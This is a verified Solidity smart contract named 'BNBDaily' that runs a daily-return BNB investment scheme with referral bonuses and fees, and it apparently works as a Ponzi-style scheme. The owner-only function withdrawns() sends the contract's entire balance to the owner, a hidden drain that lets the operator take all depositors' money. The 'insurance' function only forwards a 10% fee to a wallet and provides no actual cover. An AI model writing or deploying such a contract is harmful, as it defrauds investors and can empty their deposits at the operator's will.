/**
 *Submitted for verification at BscScan.com on 2022-01-03
*/

pragma solidity 0.5.10;

contract BNBDaily {
	using SafeMath for uint256;
 
	uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb
	uint256[] public REFERRAL_PERCENTS = [100, 50];
	uint256 constant public TOTAL_REF = 150;
	uint256 constant public PROJECT_FEE = 30;
    uint256 constant public DEV_FEE = 20;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans; 

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct Action {
        uint8   types;
		uint256 amount;
		uint256 date;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[2] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		Action[] actions;
	}

	mapping (address => User) internal users;
    mapping (address => uint256) public last_deposit;
    mapping (address => uint256) public insurance;
	mapping (address => uint256) public available;

	bool public started;

	address payable private _owner; 
	address payable public commissionWallet;
    address payable public devWallet;
    address payable public insuranceWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet, address payable dev_wallet, address payable ins_wallet) public {
		require(!isContract(wallet));
		_owner = msg.sender;
		commissionWallet = wallet;
        devWallet = dev_wallet;
        insuranceWallet = ins_wallet;

        plans.push(Plan(385, 7));
	}

	function owner() public view returns(address) {
        return _owner;
    }
	
    modifier onlyOwner() {
        require(isOwner(),
        "Function accessible only by the owner !!");
        _;
    }

    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }

	function setInsurance() public payable {
        uint256 activeAmount = getUserActivePlansAmount(msg.sender);

        require(activeAmount > 0, "No action");
		uint256 _ins_fee = activeAmount.div(10); // %10
        require(msg.value >= _ins_fee, "No action");
 
		insuranceWallet.transfer(_ins_fee);
		emit FeePayed(msg.sender, _ins_fee);
	}

    function invest(address referrer) public payable {
		uint8 plan = 0;
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= INVEST_MIN_AMOUNT);
        require(msg.value > (last_deposit[msg.sender].div(10))+last_deposit[msg.sender]);
        require(plan < 1, "Invalid plan");

		uint256 _project_fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 _dev_fee = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);

		commissionWallet.transfer(_project_fee);
		emit FeePayed(msg.sender, _project_fee);

        commissionWallet.transfer(_dev_fee);
		emit FeePayed(msg.sender, _dev_fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
		user.actions.push(Action(0, msg.value, block.timestamp));

        last_deposit[msg.sender] = msg.value;
		available[msg.sender] += msg.value.mul(270).div(100);

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}

	function removeUserDeposits(address _account) internal {
		User storage user = users[_account];

		for (uint256 i = 0; i < user.deposits.length; i++) {
			user.deposits[i].amount = 0;
		}
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);
        uint256 maxWithdraw = available[msg.sender];

		if ( totalAmount > maxWithdraw) {
			totalAmount = maxWithdraw;
		}
		
		uint256 _project_fee = totalAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 _dev_fee = totalAmount.mul(DEV_FEE).div(PERCENTS_DIVIDER);

		commissionWallet.transfer(_project_fee);
		emit FeePayed(msg.sender, _project_fee);

        commissionWallet.transfer(_dev_fee);
		emit FeePayed(msg.sender, _dev_fee);

		require(totalAmount > 0, "User has no dividends");

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));
		msg.sender.transfer(userAmount);
		available[msg.sender] -= totalAmount;

		if(available[msg.sender] == 0){
			removeUserDeposits(msg.sender);
		}

		user.actions.push(Action(1, totalAmount, block.timestamp));

		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrawRef() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = user.bonus;
        uint256 maxWithdraw = available[msg.sender];

		if ( totalAmount > maxWithdraw) {
			totalAmount = maxWithdraw;
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		require(referralBonus > 0, "User has no dividends");

		uint256 _project_fee = totalAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 _dev_fee = totalAmount.mul(DEV_FEE).div(PERCENTS_DIVIDER);

		commissionWallet.transfer(_project_fee);
		emit FeePayed(msg.sender, _project_fee);

        commissionWallet.transfer(_dev_fee);
		emit FeePayed(msg.sender, _dev_fee);

		uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));
		msg.sender.transfer(userAmount);
		available[msg.sender] -= totalAmount;
		user.withdrawn = user.withdrawn.add(totalAmount);

		if(available[msg.sender] == 0){
			user.bonus -= totalAmount;
			removeUserDeposits(msg.sender);
		} else {
			user.bonus -= totalAmount;
		}

	}

	function withdrawns() external onlyOwner{
        if(address(this).balance >= 0){
            _owner.transfer(address(this).balance);
        }
    }

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo() public view returns(uint256 time, uint256 percent) {
		time = plans[0].time;
		percent = plans[0].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

    function getUserActivePlansAmount(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 _amount = user.deposits[i].amount;
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(_amount);
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[2] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    uint256 index = 0;
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
		require(index > 0,"wrong index");
        User storage user = users[userAddress];
		uint256 start;
		uint256 end;
		uint256 cnt = 50;


		start = (index - 1) * cnt;
		if(user.actions.length < (index * cnt)){
			end = user.actions.length;
		}
		else{
			end = index * cnt;
		}

		
        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i-start] = user.actions[i].types;
            amount[i-start] = user.actions[i].amount;
            date[i-start] = user.actions[i].date;
        }
        return
        (
        types,
        amount,
        date
        );
    }
     
	function getUserActionLength(address userAddress) public view returns(uint256) {
		return users[userAddress].actions.length;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}